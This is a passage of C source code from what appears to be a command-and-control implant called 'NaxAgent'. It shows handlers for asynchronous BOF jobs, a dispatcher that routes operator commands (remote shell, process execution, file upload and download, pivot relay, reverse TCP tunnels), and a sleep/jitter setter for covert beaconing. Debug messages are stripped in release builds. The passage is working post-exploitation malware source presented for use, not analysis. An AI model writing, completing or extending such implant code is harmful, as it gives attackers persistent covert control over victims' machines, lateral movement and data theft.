static uint8_t cmd_bof_jobs(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
    (void)a; (void)t;
    char buf[1024];
    int n = nax_async_list(buf, sizeof(buf));
    *out = (uint8_t *)strdup(buf);
    *out_len = (uint32_t)n;
    return NAX_STATUS_OK;
}

static uint8_t cmd_bof_kill(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
    (void)a;
    if (!t->args || t->args_len < 4) {
        *out = (uint8_t *)strdup("jobkill: missing job index");
        *out_len = (uint32_t)strlen((char *)*out);
        return NAX_STATUS_ERR;
    }
    int idx = (int)(t->args[0] | (t->args[1]<<8) | (t->args[2]<<16) | (t->args[3]<<24));
    if (nax_async_kill(idx) == 0) {
        char msg[64]; snprintf(msg, sizeof(msg), "Job #%d stop signal sent", idx);
        *out = (uint8_t *)strdup(msg); *out_len = (uint32_t)strlen((char *)*out);
        return NAX_STATUS_OK;
    } else {
        *out = (uint8_t *)strdup("jobkill: invalid job index or not running");
        *out_len = (uint32_t)strlen((char *)*out);
        return NAX_STATUS_ERR;
    }
}

/* ===== dispatcher ===== */
uint8_t nax_cmd_sleep(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len);

/* Returns a human-readable name for a command ID — used by DBG output. */
const char *nax_cmd_name(uint8_t cmd_id)
{
    switch (cmd_id) {
    case NAX_CMD_WHOAMI:             return "whoami";
    case NAX_CMD_PWD:                return "pwd";
    case NAX_CMD_CD:                 return "cd";
    case NAX_CMD_LS:                 return "ls";
    case NAX_CMD_MKDIR:              return "mkdir";
    case NAX_CMD_RMDIR:              return "rmdir";
    case NAX_CMD_RM:                 return "rm";
    case NAX_CMD_CAT:                return "cat";
    case NAX_CMD_SHELL:              return "shell";
    case NAX_CMD_PS_LIST:            return "ps_list";
    case NAX_CMD_PS_KILL:            return "ps_kill";
    case NAX_CMD_PS_RUN:             return "ps_run";
    case NAX_CMD_IFCONFIG:           return "ifconfig";
    case NAX_CMD_UPLOAD:             return "upload";
    case NAX_CMD_DOWNLOAD:           return "download";
    case NAX_CMD_ENV:                return "env";
    case NAX_CMD_EXIT_THREAD:        return "exit_thread";
    case NAX_CMD_EXIT_PROCESS:       return "exit_process";
    case NAX_CMD_ZIP:                return "zip";
    case NAX_CMD_SLEEP:              return "sleep";
    case NAX_CMD_LINK:               return "link";
    case NAX_CMD_UNLINK:             return "unlink";
    case NAX_CMD_BOF:                return "bof";
    case NAX_CMD_BOF_ASYNC:          return "bof_async";
    case NAX_CMD_BOF_JOBS:           return "bof_jobs";
    case NAX_CMD_BOF_KILL:           return "bof_kill";
    case NAX_CMD_PROFILE_UPDATE:     return "profile_update";
    case NAX_CMD_TUNNEL_CONNECT_TCP: return "tunnel_connect_tcp";
    case NAX_CMD_TUNNEL_WRITE_TCP:   return "tunnel_write_tcp";
    case NAX_CMD_TUNNEL_CLOSE:       return "tunnel_close";
    case NAX_CMD_TUNNEL_REVERSE:     return "tunnel_reverse";
    case NAX_CMD_TUNNEL_PAUSE:       return "tunnel_pause";
    case NAX_CMD_TUNNEL_RESUME:      return "tunnel_resume";
    case 0x37:                       return "pivot_exec";
    default:                         return "unknown";
    }
}

uint8_t nax_dispatch(NaxAgent *a, NaxTask *t,
                     uint8_t **out, uint32_t *out_len)
{
    *out     = NULL;
    *out_len = 0;

    DBG_SEC("DISPATCH");
    DBG("cmd=0x%02x (%s) task_id=%u args_len=%u",
        t->cmd_id, nax_cmd_name(t->cmd_id), t->task_id, t->args_len);

    switch (t->cmd_id) {
    case NAX_CMD_WHOAMI:       return cmd_whoami(a, t, out, out_len);
    case NAX_CMD_PWD:          return cmd_pwd(a, t, out, out_len);
    case NAX_CMD_CD:           return cmd_cd(a, t, out, out_len);
    case NAX_CMD_LS:           return cmd_ls(a, t, out, out_len);
    case NAX_CMD_MKDIR:        return cmd_mkdir(a, t, out, out_len);
    case NAX_CMD_RMDIR:        return cmd_rmdir(a, t, out, out_len);
    case NAX_CMD_RM:           return cmd_rm(a, t, out, out_len);
    case NAX_CMD_CAT:          return cmd_cat(a, t, out, out_len);
    case NAX_CMD_SHELL:        return cmd_shell(a, t, out, out_len);
    case NAX_CMD_PS_LIST:      return cmd_ps(a, t, out, out_len);
    case NAX_CMD_IFCONFIG:     return cmd_ifconfig(a, t, out, out_len);
    case NAX_CMD_PS_KILL:      return cmd_ps_kill(a, t, out, out_len);
    case NAX_CMD_PS_RUN:       return cmd_ps_run(a, t, out, out_len);
    case NAX_CMD_UPLOAD:       return cmd_upload(a, t, out, out_len);
    case NAX_CMD_DOWNLOAD:     return cmd_download(a, t, out, out_len);
    case NAX_CMD_ENV:          return cmd_env(a, t, out, out_len);
    case NAX_CMD_EXIT_THREAD:
    case NAX_CMD_EXIT_PROCESS: return cmd_exit(a, t, out, out_len);

    /* 0x37 — relay packed data to a child pivot agent */
    case 0x37:                 return cmd_pivot_exec(a, t, out, out_len);
    case NAX_CMD_ZIP:               return nax_cmd_zip(a, t, out, out_len);
    case NAX_CMD_SLEEP:             return nax_cmd_sleep(a, t, out, out_len);
    case NAX_CMD_LINK:              return cmd_link(a, t, out, out_len);
    case NAX_CMD_UNLINK:            return cmd_unlink(a, t, out, out_len);
    case NAX_CMD_BOF:               return cmd_bof(a, t, out, out_len);
    case NAX_CMD_PROFILE_UPDATE:  return cmd_profile_update(a, t, out, out_len);
    case NAX_CMD_BOF_ASYNC:         return cmd_bof_async(a, t, out, out_len);
    case NAX_CMD_BOF_JOBS:          return cmd_bof_jobs(a, t, out, out_len);
    case NAX_CMD_BOF_KILL:          return cmd_bof_kill(a, t, out, out_len);

    /* Tunnel commands (implemented in tunnel.c) */
    case NAX_CMD_TUNNEL_CONNECT_TCP: return nax_cmd_tunnel_connect_tcp(a, t, out, out_len);
    case NAX_CMD_TUNNEL_WRITE_TCP:   return nax_cmd_tunnel_write_tcp(a, t, out, out_len);
    case NAX_CMD_TUNNEL_CLOSE:       return nax_cmd_tunnel_close(a, t, out, out_len);
    case NAX_CMD_TUNNEL_REVERSE:     return nax_cmd_tunnel_reverse(a, t, out, out_len);
    case NAX_CMD_TUNNEL_PAUSE:       return nax_cmd_tunnel_pause(a, t, out, out_len);
    case NAX_CMD_TUNNEL_RESUME:      return nax_cmd_tunnel_resume(a, t, out, out_len);

    default: {
        char buf[64];
        snprintf(buf, sizeof(buf), "unknown command: 0x%02x", t->cmd_id);
        *out = (uint8_t *)strdup(buf);
        *out_len = strlen(buf);
        return NAX_STATUS_ERR;
    }
    }
}

/* ===== sleep — set sleep interval (HTTPS only) ===== */
/* Args: [sleep_ms(4 LE)][jitter_pct(1)]  — 5 bytes
 * Result: [sleep_ms(4 LE)][jitter_pct(1)]["sleep=Xs jitter=Y%"] */
uint8_t nax_cmd_sleep(NaxAgent *a, NaxTask *t, uint8_t **out, uint32_t *out_len)
{
#ifndef NAX_HTTPS_MODE
    (void)a; (void)t;
#ifdef NAX_DEBUG
   const char *msg = "sleep is only supported in HTTPS mode";
#else
   const char *msg = "";
#endif
    *out = (uint8_t *)malloc(strlen(msg) + 1);
    if (*out) { memcpy(*out, msg, strlen(msg)); *out_len = strlen(msg); }
    return NAX_STATUS_ERR;
#else
    if (!t->args || t->args_len < 5) {
#ifdef NAX_DEBUG
        const char *msg = "sleep: need sleep_ms(4) + jitter(1)";
#else
        const char *msg = "";
#endif
        *out = (uint8_t *)malloc(strlen(msg) + 1);
        if (*out) { memcpy(*out, msg, strlen(msg)); *out_len = strlen(msg); }
        return NAX_STATUS_ERR;
    }
    uint32_t sleep_ms   = (uint32_t)t->args[0] | ((uint32_t)t->args[1] << 8) |
                          ((uint32_t)t->args[2] << 16) | ((uint32_t)t->args[3] << 24);
    uint8_t  jitter_pct = t->args[4] > 100 ? 100 : t->args[4];
    a->cfg.sleep_ms   = sleep_ms;
    a->cfg.jitter_pct = jitter_pct;

    /* Result: binary prefix [sleep_ms(4)][jitter(1)] + text */
    uint8_t buf[128];
    buf[0] = (uint8_t)(sleep_ms & 0xFF);
    buf[1] = (uint8_t)((sleep_ms >> 8) & 0xFF);
    buf[2] = (uint8_t)((sleep_ms >> 16) & 0xFF);
    buf[3] = (uint8_t)((sleep_ms >> 24) & 0xFF);
    buf[4] = jitter_pct;
    uint32_t pos = 5;
    if (sleep_ms == 0 || (sleep_ms % 1000u) == 0)
        pos += (uint32_t)snprintf((char *)buf + pos, sizeof(buf) - pos,
                                  "sleep=%us", sleep_ms / 1000u);
    else
        pos += (uint32_t)snprintf((char *)buf + pos, sizeof(buf) - pos,
                                  "sleep=%ums", sleep_ms);
    if (jitter_pct > 0)
        pos += (uint32_t)snprintf((char *)buf + pos, sizeof(buf) - pos,
                                  " jitter=%u%%", jitter_pct);
    *out = (uint8_t *)malloc(pos);
    if (*out) { memcpy(*out, buf, pos); *out_len = pos; }
    return NAX_STATUS_OK;
#endif
}
